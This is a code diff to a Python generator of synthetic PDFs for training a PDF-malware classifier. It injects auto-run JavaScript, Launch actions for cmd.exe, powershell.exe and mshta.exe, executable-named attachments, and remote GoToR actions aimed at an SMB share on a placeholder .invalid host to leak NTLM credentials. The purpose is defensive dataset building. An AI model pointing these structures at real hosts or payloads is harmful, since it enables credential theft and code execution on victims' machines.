@@ -6,10 +6,11 @@ links, forms, attachments and encryption.
 "Malicious" documents start as the same kind of benign-looking document and
 then get the structural markers seen in real PDF malware injected with
 pikepdf: auto-run JavaScript, event-triggered actions, launch actions and
-dropped attachments. The injected JavaScript is an inert placeholder and the
-launch targets do not exist -- there is no exploit code anywhere in this
-project. The model learns *structure*, which is what the markers share with
-real malware.
+dropped attachments. Benign documents get realistic JavaScript too (form
+helpers, calculations, print-on-open), so "has JavaScript" alone cannot
+separate the classes. Malicious JavaScript is obfuscated but inert (see
+jsgen.py), the launch targets do not exist, and attachments are placeholder
+text -- there is no exploit code anywhere in this project.
 """
 
 from __future__ import annotations
@@ -22,7 +23,7 @@ from reportlab.lib.pagesizes import A4, letter
 from reportlab.lib.pdfencrypt import StandardEncryption
 from reportlab.pdfgen import canvas
 
-INERT_JS = "/* pdfshield synthetic sample - inert */ var pdfshield_marker = 1;"
+from .jsgen import benign_document_script, benign_field_script, benign_open_script, malicious_script
 
 _WORDS = (
     "quarterly revenue invoice account policy shipment contract schedule "
@@ -91,8 +92,14 @@ def build_document(
                 c.drawString(72, 60 + i * 12, url)
                 c.linkURL(url, (72, 58 + i * 12, 300, 70 + i * 12), relative=0)
             if form:
-                c.acroForm.textfield(name="name", x=320, y=60, width=200, height=18)
-                c.acroForm.checkbox(name="agree", x=320, y=85, size=14)
+                # Varying field counts: a fixed count would let the model
+                # learn "number of /AA dictionaries" instead of behaviour.
+                names = rng.sample(["name", "qty", "price", "total", "date", "phone", "email", "amount"],
+                                   k=rng.randint(1, 6))
+                for i, fname in enumerate(names):
+                    c.acroForm.textfield(name=fname, x=320, y=60 + 24 * i, width=200, height=18)
+                if rng.random() < 0.5:
+                    c.acroForm.checkbox(name="agree", x=300, y=60, size=14)
         c.showPage()
     c.save()
     return buf.getvalue()
@@ -109,8 +116,24 @@ def _save(pdf: pikepdf.Pdf) -> bytes:
     return out.getvalue()
 
 
-def _js_action(pdf: pikepdf.Pdf) -> pikepdf.Dictionary:
-    return pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String(INERT_JS)))
+def _js_action(pdf: pikepdf.Pdf, script: str) -> pikepdf.Dictionary:
+    return pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String(script)))
+
+
+def _add_document_js(pdf: pikepdf.Pdf, scripts: list[str]) -> None:
+    """Document-level JavaScript (/Names /JavaScript): runs when the file opens."""
+    names = pikepdf.Array()
+    for i, script in enumerate(scripts):
+        names.append(pikepdf.String(f"script{i}"))
+        names.append(_js_action(pdf, script))
+    pdf.Root.Names = pdf.Root.get("/Names", pikepdf.Dictionary())
+    pdf.Root.Names.JavaScript = pikepdf.Dictionary(Names=names)
+
+
+def _add_xfa(pdf: pikepdf.Pdf) -> None:
+    packet = pdf.make_stream(b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template/></xdp:xdp>')
+    pdf.Root.AcroForm = pdf.Root.get("/AcroForm", pikepdf.Dictionary(Fields=pikepdf.Array()))
+    pdf.Root.AcroForm.XFA = pikepdf.Array([pikepdf.String("template"), packet])
 
 
 def _attach(pdf: pikepdf.Pdf, name: str, data: bytes) -> None:
@@ -126,41 +149,68 @@ def add_attachment(pdf_bytes: bytes, name: str, data: bytes) -> bytes:
 def inject_markers(pdf_bytes: bytes, rng: random.Random) -> bytes:
     """Inject a random combination of malicious structural markers.
 
-    Every sample gets at least one automatic trigger (OpenAction or /AA),
-    because an attack that needs no user click is what defines the class.
+    Every sample gets at least one automatic trigger (OpenAction, /AA or
+    document-level JavaScript), because an attack that needs no user click
+    is what defines the class.
     """
     with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
-        trigger = rng.choice(["open_action", "page_aa", "both"])
-        payload = rng.choices(["js", "launch", "embedded", "js+embedded"], weights=[5, 2, 2, 2])[0]
+        trigger = rng.choice(["open_action", "page_aa", "both", "document_js"])
+        payload = rng.choices(["js", "launch", "js+embedded", "remote_gotor"], weights=[5, 2, 3, 1])[0]
 
+        dropped = None
         if "embedded" in payload:
             dropped = rng.choice(["invoice.exe", "update.scr", "doc.vbs", "readme.js", "setup.bat"])
             _attach(pdf, dropped, b"PDFSHIELD-INERT-PLACEHOLDER " * rng.randint(4, 200))
 
         def make_action() -> pikepdf.Dictionary:
+            if payload == "remote_gotor":
+                # Opening a file on an attacker's SMB share leaks the user's
+                # NTLM credentials. The host is on the reserved .invalid TLD.
+                host = "".join(rng.choices("abcdefghijklmnop", k=8))
+                return pdf.make_indirect(pikepdf.Dictionary(
+                    S=rng.choice([pikepdf.Name.GoToR, pikepdf.Name.GoToE]),
+                    F=pikepdf.String(rng.choice([f"\\\\{host}.invalid\\share\\a.pdf",
+                                                 f"//{host}.invalid/share/a.pdf"])),
+                    D=pikepdf.Array([0, pikepdf.Name.Fit]),
+                ))
             if payload == "launch":
                 return pdf.make_indirect(pikepdf.Dictionary(
                     S=pikepdf.Name.Launch,
-                    F=pikepdf.String(rng.choice(["cmd.exe", "powershell.exe", "/bin/sh"])),
+                    F=pikepdf.String(rng.choice(["cmd.exe", "powershell.exe", "/bin/sh", "mshta.exe"])),
                     NewWindow=False,
                 ))
-            return _js_action(pdf)
+            return _js_action(pdf, malicious_script(rng, dropped))
 
-        if trigger in ("open_action", "both"):
-            pdf.Root.OpenAction = make_action()
-        if trigger in ("page_aa", "both"):
-            page = pdf.pages[0].obj
-            page.AA = pikepdf.Dictionary(O=make_action())
+        if trigger == "document_js" and payload in ("js", "js+embedded"):
+            _add_document_js(pdf, [malicious_script(rng, dropped)])
+        else:
+            if trigger in ("open_action", "both", "document_js"):
+                pdf.Root.OpenAction = make_action()
+            if trigger in ("page_aa", "both"):
+                for page in pdf.pages[: rng.randint(1, 3)]:
+                    page.obj.AA = pikepdf.Dictionary({rng.choice(["/O", "/C"]): make_action()})
 
-        # Some real samples pad themselves with extra JS objects.
-        if payload.startswith("js") and rng.random() < 0.3:
-            names = pikepdf.Array()
-            for i in range(rng.randint(1, 3)):
-                names.append(pikepdf.String(f"s{i}"))
-                names.append(_js_action(pdf))
-            pdf.Root.Names = pdf.Root.get("/Names", pikepdf.Dictionary())
-            pdf.Root.Names.JavaScript = pikepdf.Dictionary(Names=names)
+        if rng.random() < 0.1:
+            _add_xfa(pdf)
+        return _save(pdf)
 
+
+def add_benign_js(pdf_bytes: bytes, rng: random.Random) -> bytes:
+    """Add the kinds of JavaScript legitimate documents carry."""
+    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
+        fields = list(pdf.Root.AcroForm.Fields) if "/AcroForm" in pdf.Root else []
+        kinds = [k for k in ("field", "open", "document") if k != "field" or fields]
+        for kind in rng.sample(kinds, k=rng.randint(1, len(kinds))):
+            if kind == "field":
+                for field in rng.sample(fields, k=rng.randint(1, len(fields))):
+                    key, script = benign_field_script(rng)
+                    field.AA = pikepdf.Dictionary({key: _js_action(pdf, script)})
+            elif kind == "open":
+                pdf.Root.OpenAction = _js_action(pdf, benign_open_script(rng))
+            else:
+                _add_document_js(pdf, [benign_document_script(rng) for _ in range(rng.randint(1, 3))])
+        if fields and rng.random() < 0.3:
+            _add_xfa(pdf)
         return _save(pdf)
 
 
@@ -179,10 +229,31 @@ def add_navigation_open_action(pdf_bytes: bytes, rng: random.Random) -> bytes:
         return _save(pdf)
 
 
+def add_document_links(pdf_bytes: bytes, rng: random.Random) -> bytes:
+    """Links that open other local documents (/GoToR, /Launch of a .pdf),
+    common in manuals, patents and document bundles."""
+    with pikepdf.open(io.BytesIO(pdf_bytes)) as pdf:
+        page = pdf.pages[0].obj
+        page.Annots = page.get("/Annots", pikepdf.Array())
+        for i in range(rng.randint(1, 6)):
+            target = pikepdf.String(rng.choice(["appendix.pdf", "chapter2.pdf", "toolkit.pdf", "docs/help"]))
+            action = (pikepdf.Dictionary(S=pikepdf.Name.GoToR, F=target, D=pikepdf.Array([0, pikepdf.Name.Fit]))
+                      if rng.random() < 0.6 else pikepdf.Dictionary(S=pikepdf.Name.Launch, F=target))
+            page.Annots.append(pdf.make_indirect(pikepdf.Dictionary(
+                Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link,
+                Rect=[72, 40 + 12 * i, 200, 50 + 12 * i], Border=[0, 0, 0], A=action)))
+        return _save(pdf)
+
+
 def build_benign(rng: random.Random) -> bytes:
-    data = build_document(rng)
-    if rng.random() < 0.3:
+    with_js = rng.random() < 0.25
+    data = build_document(rng, form=rng.random() < 0.6) if with_js else build_document(rng)
+    if with_js:
+        data = add_benign_js(data, rng)
+    elif rng.random() < 0.3:
         data = add_navigation_open_action(data, rng)
+    if rng.random() < 0.05:
+        data = add_document_links(data, rng)
     if rng.random() < 0.08:
         # Legitimate attachments exist too (spreadsheets, source data...).
         name = rng.choice(["data.csv", "appendix.txt", "figures.xlsx"])
@@ -203,10 +274,9 @@ def build_calculating_form() -> bytes:
     rng = random.Random(0)
     data = build_document(rng, pages=1, links=0, form=True, encrypt=False)
     with pikepdf.open(io.BytesIO(data)) as pdf:
-        for field in pdf.Root.AcroForm.Fields:
-            if str(field.get("/T")) == "name":
-                field.AA = pikepdf.Dictionary(C=pdf.make_indirect(pikepdf.Dictionary(
-                    S=pikepdf.Name.JavaScript,
-                    JS=pikepdf.String('event.value = this.getField("qty").value * 9.99;'),
-                )))
+        field = pdf.Root.AcroForm.Fields[0]
+        field.AA = pikepdf.Dictionary(C=pdf.make_indirect(pikepdf.Dictionary(
+            S=pikepdf.Name.JavaScript,
+            JS=pikepdf.String('event.value = this.getField("qty").value * 9.99;'),
+        )))
         return _save(pdf)
